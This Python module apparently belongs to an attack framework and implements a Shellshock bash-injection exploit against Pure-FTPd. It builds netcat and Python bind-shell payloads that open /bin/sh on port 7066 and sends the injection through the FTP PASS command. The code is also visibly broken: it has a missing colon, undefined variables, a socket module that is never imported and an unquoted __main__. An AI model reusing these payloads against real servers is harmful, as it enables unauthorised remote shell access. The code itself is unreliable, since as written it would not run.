import os, sys
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..', '..'))
import core
class pureftpdBashInjectionMenu(core.Exploit):
    def generate(self, p)
        if self.variables["shell"] == "nc":
            shell = "nc -lp 7066 -e /bin/sh &"
        elif self.shell[0] == "python":
            shell = "python -c 'import os, subprocess; from socket import *; s = socket(AF_INET, SOCK_STREAM); s.bind((\"localhost\", 7066)); s.listen(5); client, addr = s.accept(); os.dup2(client.fileno(), 0); os.dup2(client.fileno(), 1); os.dup2(client.fileno(), 2); p = subprocess.call([\"/bin/sh\", \"-i\"])' &"
        p = "() { :;}; %s/sh -c %s" % (self.variables["rpath"], shell)
        user = self.rand_text(20)
        return (p, user)
    def deliver(self, p):
        s = socket(AF_INET, SOCK_STREAM)
        s.connect((self.host[0], 21))
        s.recv(1024)
        s.send("USER " + user)
        s.recv(1024)
        s.send("PASS " + payload)
        s.recv(1024)
def main():
  pureftpdbashinjectionmenu = pureftpdBashInjectionMenu()
  pureftpdbashinjectionmenu.cmdloop("pdf-console attack(pureftpd_bash_injection)% ")
if __name__ == __main__:
  main()
